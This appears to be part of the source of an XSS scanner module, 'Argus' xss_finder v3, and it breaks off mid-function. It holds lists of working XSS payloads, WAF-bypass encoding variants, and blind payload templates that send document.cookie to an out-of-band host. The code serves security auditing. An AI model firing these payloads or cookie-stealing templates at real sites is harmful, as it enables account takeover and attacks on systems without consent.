#!/usr/bin/env python3
"""
auditing_tools/xss_finder.py — Cross-Site Scripting Auditor (v3)
═══════════════════════════════════════════════════════════════════════════════

Comprehensive XSS detection for Argus.

v3 fixes 7 bugs in v2 and adds full infra integration:

  Bugs fixed:
    1. WAF bypass detection searched for URL-encoded payload (never present
       in body) — every encoding bypass was a guaranteed false-negative.
       Now searches for the marker + verifies context, so WAF bypasses
       actually confirm.
    2. _inject_query safe list included '&' — payloads containing '&' broke
       the outer URL structure. Removed.
    3. classify_context() was case-sensitive on <script>/<style>/<textarea>
       — <SCRIPT> fell through as html_body. Now case-insensitive.
    4. <textarea>/<title> treated as html_body — payloads must escape the
       raw-text element first. New `textarea` / `title` context classes with
       breakout-aware payloads.
    5. CSP report-only policies were analyzed as if enforced — all bypass
       warnings were false positives. Report-only now returns INFO only.
    6. html_entity WAF variant produced &#60;svg&#62; — HTML entities are NOT
       decoded to tags, so no execution possible. Removed from bypass matrix.
    7. Double-marker reflection verification — v2 could be fooled by cached
       responses (X-Cache: HIT). v3 sends two distinct markers and requires
       both to reflect before treating as confirmed.

  Infra added:
    • Config integration (MODULE_RATE_LIMITS["xss"], ACTIVE_HEADERS)
    • SharedRateLimiter + Session (no burst under concurrency)
    • scan_id support + _self_sync() → dedicated `xss_findings` table
    • _db_now() for MySQL-safe timestamps
    • finding_hash + auth_enabled + first_seen + target_host fields
    • Parallel surface testing (ThreadPoolExecutor)
    • POST body surface discovery from site_pages.json
    • HTTP header reflection test (opt-in, per-host): User-Agent, Referer,
      X-Forwarded-For, X-Real-IP, Origin, X-Client-IP
    • WAF fingerprint detection (Cloudflare, Akamai, Sucuri, ModSecurity,
      AWS WAF, Imperva, F5)
    • CSP findings promoted into the main findings list (xss_type="csp")

Nine detection phases (unchanged in spirit from v2):

  Phase 1 — Reflection probe (double-marker verified)
  Phase 2 — Context classification (tokenizer, now case-insensitive,
            textarea/title aware)
  Phase 3 — Context-aware payloads
  Phase 4 — Encoding analysis
  Phase 5 — DOM source-to-sink (fixed dedup)
  Phase 6 — Stored candidates (URL-param-only, documented limitation)
  Phase 7 — Blind OOB payload generation
  Phase 8 — WAF bypass (now actually works)
  Phase 9 — CSP analysis (report-only aware)

Plus:
  Phase 10 — Header reflection test (opt-in)

Honesty note (unchanged):
  Without a headless browser, this module cannot prove JavaScript executed.
  It proves the payload SURVIVED UNENCODED in a context where a browser
  WOULD execute it. That is the same signal Burp Scanner and XSStrike use
  in non-headless mode.

Outputs (into `outdir`):
  • xss_findings.json
  • xss_candidates.txt
  • xss_confirmed.txt
  • xss_dom.txt
  • xss_blind.txt
  • xss_csp.txt

Integration:
  main.py → run_one("xss") → run_xss_scan(urls_file, outdir,
                                          scan_id=_CURRENT_SCAN_ID)
"""

from __future__ import annotations

import argparse
import hashlib
import json
import logging
import random
import re
import statistics
import string
import sys
import threading
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

log = logging.getLogger("argus.xss_finder")


# ═════════════════════════════════════════════════════════════════════════════
#  CONFIG
# ═════════════════════════════════════════════════════════════════════════════

try:
    import config as CFG
    CFG_LOADED = True
except ImportError:
    CFG = None
    CFG_LOADED = False

try:
    from db import DB
    DB_AVAILABLE = True
except ImportError:
    DB = None
    DB_AVAILABLE = False


def _cfg(key: str, default=None):
    if not CFG_LOADED:
        return default
    return getattr(CFG, key, default)


def _xss_settings() -> dict:
    entry = (_cfg("MODULE_RATE_LIMITS", {}) or {}).get("xss", {})
    return {
        "rate_limit":   entry.get("rate_limit", 3),
        "concurrency":  entry.get("concurrency", 3),
        "timeout":      entry.get("timeout", 12),
        "max_surfaces": entry.get("max_surfaces", 400),
        "test_stored":  entry.get("test_stored", True),
        "test_dom":     entry.get("test_dom", True),
        "test_headers": entry.get("test_headers", False),
    }


def _target_headers() -> dict[str, str]:
    h = dict(_cfg("ACTIVE_HEADERS", {}) or {})
    if CFG_LOADED and getattr(CFG, "AUTH_ENABLED", False):
        auth_hdrs = getattr(CFG, "AUTH_HEADERS", {}) or {}
        if auth_hdrs:
            h.update(auth_hdrs)
    return h


def _db_now() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")


# ═════════════════════════════════════════════════════════════════════════════
#  CONSTANTS
# ═════════════════════════════════════════════════════════════════════════════

DEFAULT_TIMEOUT      = 12
BASELINE_SAMPLES     = 2
REQUEST_SLEEP        = 0.08
MAX_URLS             = 5000
MAX_CONTEXT_PAYLOADS = 6
MAX_DOM_FILES        = 40
MAX_STORED_PAGES     = 15
MARKER_PREFIX        = "argusxss"

# ── Header injection vectors (opt-in) ──────────────────────────────────────
HEADER_INJECTION_VECTORS = [
    "User-Agent", "Referer", "X-Forwarded-For", "X-Real-IP",
    "X-Forwarded-Host", "X-Client-IP", "Origin",
]

# ── WAF signatures (from response headers + body snippets) ─────────────────
WAF_SIGNATURES = {
    "cloudflare":  ["cloudflare", "cf-ray", "__cfduid", "cf-cache"],
    "akamai":      ["akamai", "akamai-ghost", "akamaighost"],
    "sucuri":      ["sucuri", "x-sucuri-id", "sucuri.net"],
    "modsecurity": ["mod_security", "modsecurity", "not acceptable"],
    "aws_waf":     ["awswaf", "x-amzn-requestid"],
    "imperva":     ["incap_ses", "visid_incap", "incapsula"],
    "f5_bigip":    ["bigip", "x-wa-info", "big-ip"],
    "barracuda":   ["barra", "barracuda"],
}

# ═════════════════════════════════════════════════════════════════════════════
#  CONTEXT-AWARE PAYLOADS
# ═════════════════════════════════════════════════════════════════════════════

CONTEXT_PAYLOADS: dict[str, list[str]] = {
    "html_body": [
        "<svg onload=alert('{m}')>",
        "<img src=x onerror=alert('{m}')>",
        "<script>alert('{m}')</script>",
        "<details open ontoggle=alert('{m}')>",
        "<iframe srcdoc=\"<script>alert('{m}')</script>\">",
        "<math><mtext><table><mglyph><svg><mtext><textarea><path id=x></textarea><img src=x onerror=alert('{m}')>",
    ],
    "attr_double": [
        "\"><svg onload=alert('{m}')>",
        "\" onmouseover=\"alert('{m}')\" x=\"",
        "\" autofocus onfocus=\"alert('{m}')\" x=\"",
        "\"><img src=x onerror=alert('{m}')>",
        "\" onanimationstart=\"alert('{m}')\" style=\"animation:x\" x=\"",
        "\" onpointerover=\"alert('{m}')\" x=\"",
    ],
    "attr_single": [
        "'><svg onload=alert('{m}')>",
        "' onmouseover='alert(\"{m}\")' x='",
        "' autofocus onfocus='alert(\"{m}\")' x='",
        "'><img src=x onerror=alert('{m}')>",
    ],
    "attr_unquoted": [
        " onmouseover=alert('{m}') x=",
        " autofocus onfocus=alert('{m}') x=",
        " onanimationstart=alert('{m}') style=animation:x x=",
        "><svg onload=alert('{m}')>",
    ],
    "event_handler": [
        "alert('{m}')",
        "';alert('{m}')//",
        "\";alert('{m}')//",
        "alert('{m}')//",
    ],
    "script_string_double": [
        "\";alert('{m}')//",
        "\\\";alert('{m}')//",
        "</script><svg onload=alert('{m}')>",
    ],
    "script_string_single": [
        "';alert('{m}')//",
        "\\';alert('{m}')//",
        "</script><svg onload=alert('{m}')>",
    ],
    "script_template": [
        "${alert('{m}')}",
        "`;alert('{m}')//",
        "</script><svg onload=alert('{m}')>",
    ],
    "script_bare": [
        "alert('{m}')",
        ";alert('{m}')//",
        "*/alert('{m}')/*",
    ],
    "url_attr": [
        "javascript:alert('{m}')",
        "javascript:alert('{m}')//",
        "data:text/html,<script>alert('{m}')</script>",
        "&#106;avascript:alert('{m}')",
    ],
    "css": [
        "</style><svg onload=alert('{m}')>",
        "}</style><svg onload=alert('{m}')>",
    ],
    "html_comment": [
        "--><svg onload=alert('{m}')>",
        "--!><svg onload=alert('{m}')>",
        "--><img src=x onerror=alert('{m}')>",
    ],
    # New in v3: raw-text elements — need closing tag breakout
    "textarea": [
        "</textarea><svg onload=alert('{m}')>",
        "</textarea><img src=x onerror=alert('{m}')>",
    ],
    "title": [
        "</title><svg onload=alert('{m}')>",
        "</title><img src=x onerror=alert('{m}')>",
    ],
    "unknown": [
        "<svg onload=alert('{m}')>",
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('{m}'))//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('{m}')//>\\x3e",
    ],
}

# ── DOM XSS sources and sinks (unchanged, proven list) ─────────────────────
DOM_SOURCES = [
    "location.hash", "location.search", "location.href", "location.pathname",
    "document.URL", "document.documentURI", "document.referrer",
    "document.cookie", "window.name", "window.location",
    "document.baseURI", "history.state", "event.data",
    "localStorage", "sessionStorage", "IndexedDB",
    "postMessage", "WebSocket", "EventSource", "Worker",
    "URLSearchParams", "URL", "document.domain",
    "navigator.userAgent", "navigator.language", "screen.name",
]

DOM_SINKS = [
    "innerHTML", "outerHTML", "insertAdjacentHTML",
    "document.write", "document.writeln",
    "eval", "Function", "setTimeout", "setInterval",
    "location.href", "location.assign", "location.replace",
    "window.open", "element.setAttribute",
    "jQuery.html", "jQuery.append", "jQuery.prepend", "jQuery.after",
    "jQuery.before", "$.globalEval", "$.getScript",
    "v-html", "dangerouslySetInnerHTML", "ng-bind-html",
    "createContextualFragment", "Range.createContextualFragment",
    "execScript", "setImmediate", "insertRow",
    "src", "srcdoc", "href",
]

DENIAL_MARKERS = (
    "blocked", "forbidden", "not allowed", "invalid input",
    "input rejected", "malicious", "waf", "sanitized",
    "not permitted", "request denied",
)

ENCODING_CHARS = ["<", ">", '"', "'", "`", "(", ")"]

ENCODED_FORMS = {
    "<":  ["&lt;", "&#60;", "&#x3c;", "%3c", "\\u003c"],
    ">":  ["&gt;", "&#62;", "&#x3e;", "%3e", "\\u003e"],
    '"':  ["&quot;", "&#34;", "&#x22;", "%22", '\\"'],
    "'":  ["&#39;", "&#x27;", "%27", "\\'", "&apos;"],
    "`":  ["&#96;", "&#x60;", "%60", "\\`"],
    "(":  ["&#40;", "&#x28;", "%28", "\\u0028"],
    ")":  ["&#41;", "&#x29;", "%29", "\\u0029"],
}

CSP_BYPASS_HOSTS = [
    "ajax.googleapis.com", "cdnjs.cloudflare.com", "cdn.jsdelivr.net",
    "unpkg.com", "code.jquery.com", "maxcdn.bootstrapcdn.com",
    "stackpath.bootstrapcdn.com", "www.google.com", "accounts.google.com",
]

STORED_REVISIT_PATTERNS = [
    "/", "/profile", "/account", "/dashboard", "/settings",
    "/comments", "/messages", "/posts", "/feed", "/notifications",
    "/admin", "/admin/users", "/support", "/tickets",
]

BLIND_PAYLOAD_TEMPLATE = (
    "<script>new Image().src='{oob}/b?d='+encodeURIComponent(document.domain)+"
    "'&c='+encodeURIComponent(document.cookie)+'&u='+encodeURIComponent(location.href);</script>"
)

BLIND_PAYLOADS_ALT = [
    "<script src='{oob}'></script>",
    "<img src='{oob}' onerror=\"fetch('{oob}?c='+document.cookie)\">",
    "<svg onload=\"fetch('{oob}?c='+document.cookie)\">",
]


# ═════════════════════════════════════════════════════════════════════════════
#  DATA MODELS
# ═════════════════════════════════════════════════════════════════════════════

@dataclass
class Baseline:
    url: str
    param: str
    location: str = "query"
    status: int = 0
    length: int = 0
    body: str = ""
    content_type: str = ""
    median_time: float = 0.0
    waf: str = ""

    def to_dict(self) -> dict:
        return {
            "url": self.url, "param": self.param, "location": self.location,
            "status": self.status, "length": self.length,
            "median_time": round(self.median_time, 3),
            "waf": self.waf,
        }


@dataclass
class XSSFinding:
    target: str
    param: str
    xss_type: str                     # reflected | stored | dom | blind | header | csp
    context: str = ""
    severity: str = "MEDIUM"
    confidence: int = 50
    confirmed: bool = False
    payload: str = ""
    marker: str = ""
    evidence: str = ""
    bypass_used: str = ""
    encoded_chars: list[str] = field(default_factory=list)
    survived_chars: list[str] = field(default_factory=list)
    param_location: str = "query"
    http_status: int = 0
    auth_enabled: bool = False
    first_seen: str = ""
    details: dict = field(default_factory=dict)

    @property
    def finding_hash(self) -> str:
        raw = f"{self.target}|{self.param}|{self.xss_type}|{self.context}"
        return hashlib.sha256(raw.encode()).hexdigest()

    @property
    def target_host(self) -> str:
        return urllib.parse.urlparse(self.target).hostname or ""

    def to_dict(self) -> dict:
        return {
            "target":         self.target,
            "target_host":    self.target_host,
            "param_name":     self.param,
            "param_location": self.param_location,
            "xss_type":       self.xss_type,
            "context":        self.context,
            "severity":       self.severity,
            "confidence":     self.confidence,
            "confirmed":      self.confirmed,
            "payload":        (self.payload or "")[:2048],
            "marker":         self.marker,
            "evidence":       (self.evidence or "")[:1024],
            "bypass_used":    self.bypass_used,
            "encoded_chars":  self.encoded_chars,
            "survived_chars": self.survived_chars,
            "http_status":    self.http_status,
            "details":        self.details,
            "auth_enabled":   self.auth_enabled,
            "finding_hash":   self.finding_hash,
            "first_seen":     self.first_seen or _db_now(),
        }


# ═════════════════════════════════════════════════════════════════════════════
#  SHARED RATE LIMITER + SESSION
# ═════════════════════════════════════════════════════════════════════════════

class SharedRateLimiter:
    def __init__(self, rate_limit: float):
        self.min_interval = 1.0 / rate_limit if rate_limit and rate_limit > 0 else 0.0
        self._last = 0.0
        self._lock = threading.Lock()

    def wait(self) -> None:
        if self.min_interval <= 0:
            return
        with self._lock:
            elapsed = time.monotonic() - self._last
            if elapsed < self.min_interval:
                time.sleep(self.min_interval - elapsed)
            self._last = time.monotonic()


class Session:
    def __init__(self, limiter: SharedRateLimiter, headers: dict, timeout: int):
        self.session = requests.Session()
        self.session.verify = False
        if headers:
            self.session.headers.update(headers)
        self.session.headers.setdefault("User-Agent", "Argus-XSS-Auditor/2.0")
        self._limiter = limiter
        self.timeout = timeout

    def request(self, method: str, url: str, **kwargs) -> Optional[requests.Response]:
        self._limiter.wait()
        try:
            return self.session.request(
                method, url,
                timeout=kwargs.pop("timeout", self.timeout),
                allow_redirects=kwargs.pop("allow_redirects", False),
                verify=False,
                **kwargs,
            )
        except requests.RequestException as e:
            log.debug(f"request failed: {method} {url}: {e}")
            return None

    def get(self, url: str, **kwargs):
        return self.request("GET", url, **kwargs)


# ═════════════════════════════════════════════════════════════════════════════
#  UTILITIES
# ═════════════════════════════════════════════════════════════════════════════

def _load_urls(input_file: Path) -> list[str]:
    if not input_file.exists():
        return []
    urls: list[str] = []
    seen: set[str] = set()
    for line in input_file.read_text().splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        token = line.split()[0]
        if not token.startswith(("http://", "https://")):
            token = "https://" + token
        if token not in seen:
            seen.add(token)
            urls.append(token)
    return urls


def _inject_query(url: str, param: str, payload: str) -> str:
    """
    Replace one param's value. The safe list keeps template chars literal
    but ENCODES & — the v2 bug that split payloads mid-string.
    """
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
    new = [(k, payload if k == param else v) for k, v in params]
    return urllib.parse.urlunparse(
        parsed._replace(
            query=urllib.parse.urlencode(new, safe=":/?=%{}<>*#$@'\"`()[],!")
        )
    )


def _body(resp: Optional[requests.Response], limit: int = 500_000) -> str:
    if resp is None:
        return ""
    try:
        return resp.text[:limit]
    except Exception:
        return ""


def _new_marker() -> str:
    return MARKER_PREFIX + "".join(
        random.choices(string.ascii_lowercase + string.digits, k=10)
    )


def _looks_denied(resp: Optional[requests.Response]) -> bool:
    if resp is None:
        return True
    if 200 <= resp.status_code < 300:
        body_low = _body(resp).lower()[:2000]
        return any(m in body_low for m in DENIAL_MARKERS)
    return False


def _fingerprint_waf(resp: Optional[requests.Response]) -> str:
    if resp is None:
        return ""
    headers_str = " ".join(f"{k} {v}" for k, v in resp.headers.items()).lower()
    body_low = _body(resp).lower()[:2000]
    for waf, sigs in WAF_SIGNATURES.items():
        for sig in sigs:
            if sig in headers_str or sig in body_low:
                return waf
    return ""


def _probe(
    session: Session, surface: dict, payload: str,
    extra_headers: Optional[dict] = None,
) -> Optional[requests.Response]:
    headers = extra_headers or None
    if surface["location"] == "query":
        return session.get(
            _inject_query(surface["url"], surface["param"], payload),
            **( {"headers": headers} if headers else {} ),
        )
    if surface["location"] == "body":
        return session.request(
            surface.get("method", "POST"), surface["url"],
            data={surface["param"]: payload},
            **( {"headers": headers} if headers else {} ),
        )
    return None


# ═════════════════════════════════════════════════════════════════════════════
#  SURFACE DISCOVERY
# ═════════════════════════════════════════════════════════════════════════════

def discover_query_surfaces(urls: list[str]) -> list[dict]:
    surfaces: list[dict] = []
    seen: set[tuple] = set()
    for url in urls:
        parsed = urllib.parse.urlparse(url)
        for pname in urllib.parse.parse_qs(parsed.query):
            key = (url, pname, "query")
            if key in seen:
                continue
            seen.add(key)
            surfaces.append({
                "url": url, "param": pname, "location": "query", "method": "GET",
            })
    return surfaces


def discover_body_surfaces(outdir: Path) -> list[dict]:
    pages_file = outdir / "site_pages.json"
    if not pages_file.exists():
        return []
    try:
        data = json.loads(pages_file.read_text())
    except Exception:
        return []

    surfaces: list[dict] = []
    seen: set[tuple] = set()
    for page in data.get("pages") or []:
        page_url = page.get("url") or ""
        for form in page.get("forms") or []:
            if (form.get("method") or "").upper() != "POST":
                continue
            action = form.get("action") or page_url
            for field_def in form.get("fields") or []:
                fname = field_def.get("name") or ""
                if not fname:
                    continue
                key = (action, fname, "body")
                if key in seen:
                    continue
                seen.add(key)
                surfaces.append({
                    "url": action, "param": fname,
                    "location": "body", "method": "POST",
                })
    return surfaces


# ═════════════════════════════════════════════════════════════════════════════
#  BASELINE
# ═════════════════════════════════════════════════════════════════════════════

def build_baseline(session: Session, surface: dict) -> Baseline:
    baseline = Baseline(
        url=surface["url"], param=surface["param"],
        location=surface["location"],
    )
    times: list[float] = []

    for _ in range(BASELINE_SAMPLES):
        start = time.monotonic()
        if surface["location"] == "body":
            resp = session.request(
                surface.get("method", "POST"), surface["url"],
                data={surface["param"]: "argusbaseline"},
            )
        else:
            resp = session.get(surface["url"])
        times.append(time.monotonic() - start)
        if resp and not baseline.status:
            baseline.status = resp.status_code
            baseline.body = _body(resp)
            baseline.length = len(baseline.body)
            baseline.content_type = resp.headers.get("Content-Type", "")
            baseline.waf = _fingerprint_waf(resp)
        time.sleep(REQUEST_SLEEP)

    if times:
        baseline.median_time = statistics.median(times)
    return baseline


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 1 — REFLECTION PROBE (double-marker verified)
# ═════════════════════════════════════════════════════════════════════════════

def probe_reflection(session: Session, surface: dict) -> dict:
    """
    Send TWO distinct markers to detect cached-reflection false positives.

    Returns dict: {reflected, index, marker, unencoded, cache_hit}
    """
    marker1 = _new_marker()
    resp = _probe(session, surface, marker1)
    time.sleep(REQUEST_SLEEP)

    result = {"reflected": False, "index": -1, "marker": marker1,
              "unencoded": False, "cache_hit": False}
    if resp is None:
        return result

    body = _body(resp)
    idx = body.find(marker1)
    if idx >= 0:
        result["reflected"] = True
        result["index"] = idx
        result["unencoded"] = True
    else:
        # Check HTML-encoded form (any partial)
        for ch_ord in (ord(marker1[0]), ord(marker1[-1])):
            if f"&#{ch_ord};" in body:
                result["reflected"] = True
                result["unencoded"] = False
                return result
        return result

    # Second marker — verifies we're not seeing a cached response from a
    # previous request where marker1 was reflected
    marker2 = _new_marker()
    resp2 = _probe(session, surface, marker2)
    time.sleep(REQUEST_SLEEP)
    if resp2 is None:
        return result
    body2 = _body(resp2)
    if marker2 not in body2:
        result["cache_hit"] = True
        result["reflected"] = False
        return result

    return result


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 2 — CONTEXT CLASSIFIER (case-insensitive, textarea/title aware)
# ═════════════════════════════════════════════════════════════════════════════

def classify_context(body: str, index: int) -> str:
    """
    Tokenize HTML up to `index` and determine injection context.

    Returns: html_body, html_comment, attr_double, attr_single, attr_unquoted,
    event_handler, url_attr, script_string_double, script_string_single,
    script_template, script_bare, css, textarea, title, unknown
    """
    if index < 0 or index >= len(body):
        return "unknown"

    prefix = body[:index].lower()

    in_comment = False
    in_script = False
    in_style = False
    in_raw_text = ""           # "textarea" | "title" | ""
    in_tag = False
    tag_name = ""
    quote = ""
    last_attr = ""
    in_js_string = ""
    js_escape = False

    i = 0
    n = len(prefix)
    while i < n:
        ch = prefix[i]

        # ── Comment ─────────────────────────────────────────────────────────
        if in_comment:
            if prefix.startswith("-->", i):
                in_comment = False
                i += 3
                continue
            i += 1
            continue

        # ── Raw-text (textarea, title) ──────────────────────────────────────
        if in_raw_text:
            close = f"</{in_raw_text}"
            if prefix.startswith(close, i):
                in_raw_text = ""
                i += len(close)
                continue
            i += 1
            continue

        # ── Script / Style ──────────────────────────────────────────────────
        if in_script:
            if prefix.startswith("</script", i):
                in_script = False
                in_style = False
                i += 8
                continue
            if in_style:
                if prefix.startswith("</style", i):
                    in_style = False
                    in_script = False
                    i += 7
                    continue
                i += 1
                continue
            # JS string tracking
            if js_escape:
                js_escape = False
                i += 1
                continue
            if ch == "\\":
                js_escape = True
                i += 1
                continue
            if in_js_string:
                if ch == in_js_string:
                    in_js_string = ""
                i += 1
                continue
            if ch in ("'", '"', "`"):
                in_js_string = ch
                i += 1
                continue
            i += 1
            continue

        # ── Inside a tag ────────────────────────────────────────────────────
        if in_tag:
            if quote:
                if ch == quote:
                    quote = ""
                i += 1
                continue
            if ch in ("'", '"'):
                quote = ch
                i += 1
                continue
            if ch == ">":
                in_tag = False
                tag_name = ""
                last_attr = ""
                i += 1
                continue
            if ch.isalpha() or ch == "-":
                j = i
                while j < n and (prefix[j].isalnum() or prefix[j] in "-_"):
                    j += 1
                last_attr = prefix[i:j].lower()
                i = j
                continue
            i += 1
            continue

        # ── Outside any tag ─────────────────────────────────────────────────
        if prefix.startswith("<!--", i):
            in_comment = True
            i += 4
            continue
        if prefix.startswith("<script", i):
            in_script = True
            i += 7
            gt = prefix.find(">", i)
            i = (gt + 1) if gt >= 0 else n
            continue
        if prefix.startswith("<style", i):
            in_script = True
            in_style = True
            i += 6
            gt = prefix.find(">", i)
            i = (gt + 1) if gt >= 0 else n
            continue
        if prefix.startswith("<textarea", i):
            in_raw_text = "textarea"
            i += 9
            gt = prefix.find(">", i)
            i = (gt + 1) if gt >= 0 else n
            continue
        if prefix.startswith("<title", i):
            in_raw_text = "title"
            i += 6
            gt = prefix.find(">", i)
            i = (gt + 1) if gt >= 0 else n
            continue
        if ch == "<":
            in_tag = True
            tag_name = ""
            last_attr = ""
            i += 1
            j = i
            while j < n and (prefix[j].isalnum() or prefix[j] in "-:"):
                j += 1
            tag_name = prefix[i:j].lower()
            i = j
            continue
        i += 1

    # ── Determine context ───────────────────────────────────────────────────
    if in_comment:
        return "html_comment"
    if in_raw_text:
        return in_raw_text
    if in_script and in_style:
        return "css"
    if in_script:
        if in_js_string == "`":
            return "script_template"
        if in_js_string == "'":
            return "script_string_single"
        if in_js_string == '"':
            return "script_string_double"
        return "script_bare"
    if in_tag:
        if quote == '"':
            if last_attr in ("href", "src", "action", "formaction", "data"):
                return "url_attr"
            if last_attr.startswith("on"):
                return "event_handler"
            return "attr_double"
        if quote == "'":
            if last_attr in ("href", "src", "action", "formaction", "data"):
                return "url_attr"
            if last_attr.startswith("on"):
                return "event_handler"
            return "attr_single"
        return "attr_unquoted"

    return "html_body"


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 3 + 4 — CONTEXT-AWARE PAYLOADS + ENCODING ANALYSIS
# ═════════════════════════════════════════════════════════════════════════════

def analyze_encoding(body: str, index: int, payload: str) -> tuple[list[str], list[str]]:
    if index < 0:
        return [], []
    window = body[max(0, index - 50): index + len(payload) + 50]
    encoded: list[str] = []
    survived: list[str] = []

    for ch in ENCODING_CHARS:
        if ch in payload:
            if ch in window:
                survived.append(ch)
            for form in ENCODED_FORMS.get(ch, []):
                if form.lower() in window.lower():
                    encoded.append(ch)
                    break
    return encoded, survived


def _waf_variants(payload: str) -> list[tuple[str, str]]:
    """
    Return (variant, label) pairs for WAF bypass.

    v3: removed html_entity variant (entities don't decode to tags).
    v3: marker-based detection below means variant strings don't matter
        for matching — we look for the marker, not the encoded form.
    """
    variants: list[tuple[str, str]] = []

    mixed = re.sub(
        r"\b(svg|img|script|alert|onload|onerror|onmouseover|onfocus)\b",
        lambda m: "".join(c.upper() if i % 2 else c.lower()
                          for i, c in enumerate(m.group(0))),
        payload, flags=re.I,
    )
    if mixed != payload:
        variants.append((mixed, "case_mix"))

    variants.append((urllib.parse.quote(payload, safe=""), "url_encode"))
    variants.append((urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe=""), "double_url_encode"))

    uni = payload.replace("a", "\\u0061").replace("l", "\\u006c").replace("e", "\\u0065")
    if uni != payload:
        variants.append((uni, "unicode_escape"))

    nl = payload.replace(" ", "%0a")
    if nl != payload:
        variants.append((nl, "newline_inject"))

    bt = payload.replace('="', "=`").replace('"', "`")
    if bt != payload:
        variants.append((bt, "backtick_attr"))

    cb = payload.replace("<svg", "<svg/**/").replace("<img", "<img/**/")
    if cb != payload:
        variants.append((cb, "comment_break"))

    chunk = payload.replace("<svg", "<s\\x76g").replace("<img", "<i\\x6dg")
    if chunk != payload:
        variants.append((chunk, "chunked_tag"))

    return variants


def test_context_payloads(
    session: Session, surface: dict, baseline: Baseline, context: str,
) -> list[XSSFinding]:
    findings: list[XSSFinding] = []
    payloads = (CONTEXT_PAYLOADS.get(context) or CONTEXT_PAYLOADS["unknown"])[:MAX_CONTEXT_PAYLOADS]

    for template in payloads:
        marker = _new_marker()
        payload = template.format(m=marker)
        resp = _probe(session, surface, payload)
        time.sleep(REQUEST_SLEEP)

        if resp is None or _looks_denied(resp):
            continue

        body = _body(resp)
        idx = body.find(payload)

        # ── Exact payload survived
        if idx >= 0:
            encoded, survived = analyze_encoding(body, idx, payload)
            executable = (
                "(" in survived and ")" in survived
                and any(c in survived for c in ("<", '"', "'", "`"))
            )
            confidence = 92 if executable else 70
            severity = "CRITICAL" if executable else "HIGH"

            findings.append(XSSFinding(
                target=surface["url"], param=surface["param"],
                param_location=surface["location"],
                xss_type="reflected", context=context,
                severity=severity, confidence=confidence, confirmed=executable,
                payload=payload, marker=marker,
                evidence=(
                    f"Payload survived UNENCODED in {context} context — "
                    f"survived: {''.join(survived) or '(none)'}"
                ),
                encoded_chars=encoded, survived_chars=survived,
                http_status=resp.status_code,
                details={
                    "reflection_index": idx, "context": context,
                    "executable": executable,
                    "body_snippet": body[max(0, idx - 80): idx + len(payload) + 80],
                },
            ))
            return findings

        # ── Marker present but payload broken up
        midx = body.find(marker)
        if midx >= 0:
            encoded, survived = analyze_encoding(body, midx, payload)
            findings.append(XSSFinding(
                target=surface["url"], param=surface["param"],
                param_location=surface["location"],
                xss_type="reflected", context=context,
                severity="MEDIUM", confidence=55, confirmed=False,
                payload=payload, marker=marker,
                evidence=f"Marker reflected in {context} but payload was filtered/modified",
                encoded_chars=encoded, survived_chars=survived,
                http_status=resp.status_code,
                details={"body_snippet": body[max(0, midx - 80): midx + 120]},
            ))
            return findings

        # ── WAF block → bypass variants (marker-based detection)
        if resp.status_code in (403, 406, 429, 501):
            for variant, label in _waf_variants(payload):
                v_resp = _probe(session, surface, variant)
                time.sleep(REQUEST_SLEEP)
                if v_resp is None or _looks_denied(v_resp):
                    continue
                v_body = _body(v_resp)

                # Search for marker (always alphanumeric — never WAF-encoded)
                v_midx = v_body.find(marker)
                if v_midx < 0:
                    continue

                # Verify context at the marker position
                actual_ctx = classify_context(v_body, v_midx)
                if actual_ctx != context and context != "unknown":
                    continue

                encoded, survived = analyze_encoding(v_body, v_midx, variant)
                findings.append(XSSFinding(
                    target=surface["url"], param=surface["param"],
                    param_location=surface["location"],
                    xss_type="reflected", context=context,
                    severity="HIGH", confidence=80, confirmed=True,
                    payload=variant, marker=marker, bypass_used=label,
                    evidence=(
                        f"WAF bypass '{label}' reflected marker in "
                        f"{actual_ctx} context"
                    ),
                    encoded_chars=encoded, survived_chars=survived,
                    http_status=v_resp.status_code,
                    details={
                        "original_payload": payload,
                        "variant": variant,
                        "actual_context": actual_ctx,
                    },
                ))
                return findings

    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 5 — DOM XSS STATIC ANALYSIS
# ═════════════════════════════════════════════════════════════════════════════

def analyze_dom_js(js_url: str, js_content: str, target_page: str) -> list[XSSFinding]:
    findings: list[XSSFinding] = []
    if not js_content:
        return findings

    lines = js_content.splitlines()
    source_lines: dict[str, list[int]] = {}
    sink_lines: dict[str, list[int]] = {}

    for i, line in enumerate(lines):
        for src in DOM_SOURCES:
            if src in line:
                source_lines.setdefault(src, []).append(i)
        for sink in DOM_SINKS:
            if sink in line:
                sink_lines.setdefault(sink, []).append(i)

    if not source_lines or not sink_lines:
        return findings

    for src, src_positions in source_lines.items():
        for sink, sink_positions in sink_lines.items():
            matched = False
            for sp in src_positions:
                for kp in sink_positions:
                    if abs(sp - kp) <= 15:
                        confidence = 75 if abs(sp - kp) <= 5 else 60
                        findings.append(XSSFinding(
                            target=target_page, param="(DOM)",
                            xss_type="dom", context="dom",
                            severity="HIGH" if confidence >= 75 else "MEDIUM",
                            confidence=confidence, confirmed=False,
                            payload=f"{src} → {sink}",
                            evidence=(
                                f"Source '{src}' flows to sink '{sink}' "
                                f"within {abs(sp - kp)} lines in {js_url}"
                            ),
                            details={
                                "js_url": js_url, "source": src, "sink": sink,
                                "source_line": sp + 1, "sink_line": kp + 1,
                                "snippet": lines[max(0, min(sp, kp) - 2): max(sp, kp) + 3],
                            },
                        ))
                        matched = True
                        break
                if matched:
                    break

    return findings


def run_dom_analysis(session: Session, outdir: Path) -> list[XSSFinding]:
    findings: list[XSSFinding] = []
    js_urls: list[str] = []

    for name in ("urls_js_files.txt", "js_files.txt"):
        p = outdir / name
        if p.exists():
            for line in p.read_text().splitlines():
